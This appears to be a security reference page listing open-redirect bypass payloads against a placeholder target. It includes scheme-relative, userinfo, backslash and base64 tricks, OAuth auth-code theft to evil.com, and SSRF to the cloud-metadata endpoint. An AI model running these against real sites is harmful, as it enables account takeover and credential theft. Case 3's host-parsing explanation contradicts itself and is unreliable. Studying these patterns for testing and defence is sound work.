# Case studies — the named open-redirect shapes

## Case 1 — the `//` scheme-relative on a `startswith('/')` check

```text
target:  /login?next=<param>
check:   next.startswith('/')  -> allows 'internal' paths
probe:   ?next=//evil.com -> Location: //evil.com -> the browser goes to
         https://evil.com — the startswith('/') check passed a cross-origin URL
fix:     the check needs `startswith('/') AND not startswith('//')` OR a
         parsed-host allowlist
```

The classic — a `startswith('/')` check that treats `//evil.com` as a
relative path; the browser reads it scheme-relative → cross-origin.

## Case 2 — the userinfo `@` on a `hostname` check

```text
check:   urlparse(next).netloc == 'target.com'  <- checks netloc not hostname
probe:   ?next=https://target.com@evil.com
         urlparse -> netloc='target.com@evil.com' != 'target.com' — FAILS
         BUT a string-check `'target.com' in next` -> passes -> Location:
         https://target.com@evil.com -> browser host=evil.com
```

The substring-vs-parse gap — the check reads `target.com` substring; the
browser reads host=`evil.com` via userinfo.

## Case 3 — the `\@` backslash-userinfo differential

```text
check:   urlparse(next).hostname == 'target.com'
probe:   ?next=https://evil.com\@target.com
         urlparse('https://evil.com\\@target.com').hostname — the `\@` is
         in the netloc -> hostname='evil.com\@target.com'? or reads the @
         -> the browser: the `\` is a path-sep -> host=target.com... OR
         host=evil.com depending on the parse — the DIFFERENTIAL is the bug
```

## Case 4 — the substring `contains('target.com')` in the path

```text
check:   'target.com' in next
probe:   ?next=https://evil.com/target.com
         the check passes (the substring is in the path) ->
         Location: https://evil.com/target.com -> browser host=evil.com
```

## Case 5 — the OAuth redirect_uri through an open redirect

```text
the OAuth allowlist: redirect_uri must start https://client-app.com/
the gap: client-app.com/redirect?next=<X> is an open-redirect
the chain: redirect_uri = https://client-app.com/redirect?next=https://evil.com
           -> OAuth 302s to client-app.com/redirect?next=https://evil.com
           -> that 302s to https://evil.com -> evil.com?code=<the-auth-code>
```

The OAuth chain — `web-oauth-sso`'s redirect_uri laundering via a
client-app open-redirect.

## Case 6 — the SSRF-fetcher follows the redirect

```text
the feature: /fetch?url=<X> — a server-side fetch, allowlisted to target.com
the gap: the fetcher follows 3xx Location
the chain: /fetch?url=https://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2F
           -> the fetcher fetches target.com/redirect -> follows Location
           -> reaches 169.254.169.254 -> the metadata -> SSRF
```

The SSRF-chain — `web-ssrf`'s redirect-follow bypass of a fetcher allowlist.

## Case 7 — the Referer-derived back-redirect

```text
the flow: /back 302s to the Referer header
probe:   GET /back  Referer: https://evil.com
         -> Location: https://evil.com — a Referer-trust gap
```

## Case 8 — the two-step stored redirect

```text
step 1: /register?return_to=https://evil.com  <- the param stored in session
step 2: /login -> 302 Location: https://evil.com — the stored fires on login
```

## Case 9 — the `%5c`/`\\` backslash-to-slash

```text
check:   next.startswith('/')  AND  not next.startswith('//')
probe:   ?next=/\evil.com  -> startswith('/') true, not '//' true ->
         Location: /\evil.com -> browser: the `\` is a path-sep -> /\  ->
         resolves to //evil.com -> cross-origin
```

## Case 10 — the b64-decoded param

```text
the param: ?next=<base64> — the server b64-decodes before redirect
probe:   ?next=aHR0cHM6Ly9ldmlsLmNvbQ==  -> decodes to https://evil.com
         -> Location: https://evil.com
```

## The case-to-class map

| The case | The mechanism | The skill/route |
|---|---|---|
| `//` on a `startswith('/')` | the scheme-relative gap | this class |
| `@` userinfo | the userinfo-parse gap | this class |
| `\@` backslash-userinfo | the parser differential | this class/`web-parser-differential` |
| substring-in-path | the contains-check gap | this class |
| OAuth redirect_uri | the chain-launder | `web-oauth-sso` |
| fetcher-follows-redirect | the SSRF chain | `web-ssrf` |
| Referer-derived | the header-trust | this class |
| stored-redirect | the two-step | this class |
| `javascript:`/`data:` | the scheme-XSS twin | `web-xss` |
| `meta`/JS | the client-side twin | this class |
